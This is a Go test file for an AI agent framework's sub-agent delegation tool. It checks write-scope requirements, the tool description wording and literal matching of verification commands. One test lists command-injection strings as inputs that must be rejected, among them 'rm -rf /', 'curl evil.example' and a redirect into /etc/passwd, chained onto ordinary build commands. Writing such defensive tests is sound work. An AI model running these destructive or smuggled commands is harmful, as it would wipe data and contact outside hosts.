package tools

import (
	"context"
	"encoding/json"
	"fmt"
	"slices"
	"strings"
	"testing"
)

type taskTestCreator struct{}

type countingTaskCreator struct {
	calls int
}

func (c *countingTaskCreator) CreateSubAgent(context.Context, string, string, string, string, WriteScope) (TaskHandle, error) {
	c.calls++
	return TaskHandle{Status: "started", TaskID: "adhoc-7", AgentID: "agent-7", Message: "running in background"}, nil
}

func (*countingTaskCreator) AvailableSubAgents() []AgentInfo {
	return []AgentInfo{{Name: "builder"}}
}

func (taskTestCreator) CreateSubAgent(ctx context.Context, description, agentType string, planTaskRef, semanticTaskKey string, expectedWriteScope WriteScope) (TaskHandle, error) {
	return TaskHandle{Status: "started", TaskID: "adhoc-1", AgentID: "agent-1", Message: description + ":" + agentType, PlanTaskRef: planTaskRef, SemanticTaskKey: semanticTaskKey, ExpectedWriteScope: expectedWriteScope}, nil
}

func (taskTestCreator) AvailableSubAgents() []AgentInfo {
	return []AgentInfo{{Name: "builder", Description: "General coding", Capabilities: []string{"edit", "test"}, PreferredTasks: []string{"feature", "bugfix"}, WriteMode: "write", DelegationPolicy: "leaf_preferred"}}
}

func TestDelegateToolParametersExposeIdentityScopeAndAgentMetadata(t *testing.T) {
	params := NewDelegateTool(taskTestCreator{}).Parameters()
	text := fmt.Sprint(params)
	for _, want := range []string{
		"plan_task_ref",
		"semantic_task_key",
		"expected_write_scope",
		"capabilities=edit,test",
		"delegation_policy=leaf_preferred",
	} {
		if !strings.Contains(text, want) {
			t.Fatalf("Parameters() missing %q in %s", want, text)
		}
	}
}

func TestDelegateToolReturnsSingleBackgroundHandle(t *testing.T) {
	creator := &countingTaskCreator{}
	result, err := NewDelegateTool(creator).Execute(context.Background(), json.RawMessage(`{"description":"implement feature","agent_type":"builder","expected_write_scope":{"path_prefix":["internal/agent"]}}`))
	if err != nil {
		t.Fatalf("Execute() error = %v", err)
	}
	if creator.calls != 1 {
		t.Fatalf("CreateSubAgent() calls = %d, want 1", creator.calls)
	}
	var handle TaskHandle
	if err := json.Unmarshal([]byte(result), &handle); err != nil {
		t.Fatalf("unmarshal result: %v", err)
	}
	if handle.Status != "started" || handle.TaskID != "adhoc-7" || handle.AgentID != "agent-7" || handle.Message != "running in background" {
		t.Fatalf("handle = %#v, want one asynchronous startup handle", handle)
	}
}

func TestDelegateToolRequiresUsableWriteScope(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{name: "omitted", args: `{"description":"implement feature","agent_type":"builder"}`},
		{name: "empty object", args: `{"description":"implement feature","agent_type":"builder","expected_write_scope":{}}`},
		{
			name: "blank entries only",
			args: `{"description":"implement feature","agent_type":"builder","expected_write_scope":{"files":["  "]}}`,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			creator := &countingTaskCreator{}
			_, err := NewDelegateTool(creator).Execute(context.Background(), json.RawMessage(tc.args))
			if err == nil {
				t.Fatal("Execute() error = nil, want a write-scope repair instruction")
			}
			for _, want := range []string{"read_only=true", "files/path_prefix/modules"} {
				if !strings.Contains(err.Error(), want) {
					t.Fatalf("Execute() error = %q, want it to mention %q", err, want)
				}
			}
			if creator.calls != 0 {
				t.Fatalf("CreateSubAgent() calls = %d, want the delegation rejected before admission", creator.calls)
			}
		})
	}
}

func TestDelegateToolAcceptsReadOnlyScope(t *testing.T) {
	creator := &countingTaskCreator{}
	if _, err := NewDelegateTool(creator).Execute(context.Background(), json.RawMessage(
		`{"description":"survey the parser","agent_type":"builder","expected_write_scope":{"read_only":true}}`,
	)); err != nil {
		t.Fatalf("Execute() error = %v, want read-only scope accepted", err)
	}
	if creator.calls != 1 {
		t.Fatalf("CreateSubAgent() calls = %d, want 1", creator.calls)
	}
}

func TestDelegateToolParametersMarkWriteScopeRequired(t *testing.T) {
	params := NewDelegateTool(taskTestCreator{}).Parameters()
	required, ok := params["required"].([]string)
	if !ok {
		t.Fatalf("Parameters()[\"required\"] = %#v, want []string", params["required"])
	}
	if !slices.Contains(required, "expected_write_scope") {
		t.Fatalf("required = %v, want expected_write_scope included", required)
	}
}

func TestDelegateToolDescriptionKeepsUsageSemantics(t *testing.T) {
	desc := NewDelegateTool(taskTestCreator{}).Description()
	for _, want := range []string{
		"delivered asynchronously and flows back to you automatically",
		"reuse it with Notify or Cancel for follow-up instead of creating a duplicate delegate",
		"delegation workflow section governs when to continue an existing task with Notify versus creating a new delegate, and when parallel delegates are safe",
	} {
		if !strings.Contains(desc, want) {
			t.Fatalf("Description() missing %q in %q", want, desc)
		}
	}
	// Orchestration strategy (Notify-vs-new-delegate, write-scope parallelism)
	// lives in the SubAgent Workflow prompt block, not the tool description.
	for _, unwanted := range []string{
		"Spawn", // Delegate results flow back asynchronously; no background-process tool references belong here
		"Use Notify(existing) for the same task's follow-up",
		"Only parallelize tasks when their write scopes are clearly independent",
	} {
		if strings.Contains(desc, unwanted) {
			t.Fatalf("Description() should not duplicate workflow-block strategy %q in %q", unwanted, desc)
		}
	}
}

// The gate that lets an authorized command through matches it literally, so a
// declaration that itself contains shell control characters would hand the
// worker arbitrary execution under one approved-looking entry. Those are
// refused at delegation time, where the delegator can still fix them.
func TestDelegateToolRejectsVerificationCommandsThatSmuggleExecution(t *testing.T) {
	for _, tc := range []struct {
		name    string
		command string
	}{
		{name: "chaining", command: "go build ./... && rm -rf /"},
		{name: "piping", command: "go test ./... | tee out"},
		{name: "sequencing", command: "go vet ./...; curl evil.example"},
		{name: "substitution", command: "go test $(cat cmd.txt)"},
		{name: "backticks", command: "go test `cat cmd.txt`"},
		{name: "redirection", command: "go build ./... > /etc/passwd"},
		{name: "newline", command: "go build ./...\nrm -rf /"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			creator := &countingTaskCreator{}
			args, err := json.Marshal(map[string]any{
				"description": "implement feature",
				"agent_type":  "builder",
				"expected_write_scope": map[string]any{
					"path_prefix":           []string{"internal"},
					"verification_commands": []string{tc.command},
				},
			})
			if err != nil {
				t.Fatalf("marshal args: %v", err)
			}
			_, execErr := NewDelegateTool(creator).Execute(context.Background(), args)
			if execErr == nil {
				t.Fatal("Execute() error = nil, want the smuggled command rejected")
			}
			if !strings.Contains(execErr.Error(), "declare each command separately") {
				t.Fatalf("Execute() error = %q, want the repair instruction", execErr)
			}
			if creator.calls != 0 {
				t.Fatalf("CreateSubAgent() calls = %d, want the delegation rejected before admission", creator.calls)
			}
		})
	}
}

func TestDelegateToolAcceptsPlainVerificationCommands(t *testing.T) {
	creator := &countingTaskCreator{}
	args := json.RawMessage(`{"description":"implement feature","agent_type":"builder","expected_write_scope":{"path_prefix":["internal"],"verification_commands":["go build ./...","go test ./internal/agent"]}}`)
	if _, err := NewDelegateTool(creator).Execute(context.Background(), args); err != nil {
		t.Fatalf("Execute() error = %v, want plain commands accepted", err)
	}
	if creator.calls != 1 {
		t.Fatalf("CreateSubAgent() calls = %d, want 1", creator.calls)
	}
}

func TestWriteScopeAllowsCommandMatchesLiterally(t *testing.T) {
	scope := WriteScope{VerificationCommands: []string{"go build ./...", "go test ./internal/agent"}}
	for _, tc := range []struct {
		command string
		want    bool
	}{
		{command: "go build ./...", want: true},
		{command: "  go test ./internal/agent ", want: true},
		{command: "go build", want: false},
		{command: "go build ./... -v", want: false},
		{command: "GOFLAGS=-x go build ./...", want: false},
		{command: "", want: false},
	} {
		if got := scope.AllowsCommand(tc.command); got != tc.want {
			t.Fatalf("AllowsCommand(%q) = %v, want %v", tc.command, got, tc.want)
		}
	}
}
